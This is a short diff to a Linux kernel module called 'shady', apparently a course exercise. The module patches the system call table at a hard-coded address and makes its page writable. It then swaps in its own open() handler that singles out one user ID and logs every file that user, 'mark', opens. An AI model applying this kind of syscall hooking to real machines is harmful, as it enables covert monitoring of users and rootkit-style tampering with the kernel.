@@ -46,13 +46,13 @@ static int shady_ndevices = SHADY_NDEVICES;
 //
 // XXX HARD CODE SYSTEM CALL TABLE ADDRESS
 //
-static unsigned long * syscall_tableaddress = 0xffffffff81801400;
+static unsigned long * syscall_tableaddress = (unsigned long *) 0xffffffff81801400;
 
 //
 // XXX HARD CODE MARKS UID
 //
 
-static unsigned int marks_uid = 1001;
+static unsigned int marks_uid = 1000;
 
 module_param(shady_ndevices, int, S_IRUGO);
 /* ================================================================ */
@@ -78,6 +78,7 @@ asmlinkage int (*old_open) (const char*, int, int); // Old function pointer
 asmlinkage int my_open (const char* file, int flags, int mode) // Replacement function
 {
   unsigned int userId = get_current_user()->uid.val ;  
+  printk(KERN_INFO "mark is about to open \'%s\'\n", file);
 
   if(userId == marks_uid)
   {
@@ -261,7 +262,7 @@ shady_init_module(void)
   // XXX EDIT PGT
   //
   unsigned int level;
-  pte_t *pte = lookup_address(syscall_tableaddress, &level);
+  pte_t *pte = lookup_address((unsigned long int)syscall_tableaddress, &level);
   if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
 
   //
